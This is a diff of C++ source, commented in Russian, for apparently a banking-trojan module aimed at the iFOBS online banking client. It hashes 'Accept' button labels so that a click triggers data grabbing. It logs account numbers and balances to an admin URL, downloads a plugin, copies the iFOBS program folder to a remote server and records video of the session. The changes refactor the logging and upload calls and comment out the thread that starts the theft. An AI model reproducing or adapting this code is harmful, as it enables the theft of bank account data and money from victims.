@@ -53,8 +53,6 @@ char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования н
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
 
-VideoSendLog* vsl = 0;
-
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	ForFindControl* ffc = (ForFindControl*)lParam;
@@ -223,7 +221,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
 	AccBalans* ab = (AccBalans*)p;
-	VideoSendLogName log( *vsl, "ifobs" );
+	VideoLog log( "ifobs" );
 	log.Send( 10, "Счет: %s, баланс: %s", ab->acc, ab->balans );
 	if( GetAdminUrl(urlAdmin) )
 	{
@@ -254,8 +252,7 @@ void WINAPI PutBalans( const char* acc, const char* balans )
 
 DWORD WINAPI PluginIFobs(LPVOID)
 {
-	vsl = new VideoSendLog();
-	VideoSendLogName log( *vsl, "ifobs" );
+	VideoLog log( "ifobs" );
 	log.Send2( 0, "Загрузка плагина ifobs.plug" );
 	TPlugin ifobsPlug("ifobs.plug");
 	if( ifobsPlug.Download(true) )
@@ -318,7 +315,7 @@ DWORD WINAPI SendIFobs(LPVOID)
 	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
 	{
 		DBG( "IFobs", "Копирование на сервер" );
-		VideoRecorder::SendFiles(tempFolder);
+		VideoProcess::SendFiles( 0, tempFolder );
 		DeleteFolders(tempFolder);
 		DBG( "IFobs", "Копирование на сервер окончено" );
 	}
@@ -331,10 +328,11 @@ void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-	RunThread( PluginIFobs, 0 );
-	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-		MegaJump(SendIFobs);
-	VideoRecorderSrv::StartInfiniteRecording("IFobs");
+//	RunThread( PluginIFobs, 0 );
+//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+//		MegaJump(SendIFobs);
+//	VideoProcess::RecordPID( "IFobs" );
+	VideoProcess::SendLog( "test", 0, "go!");
 }
 
 bool Init( const char* appName )
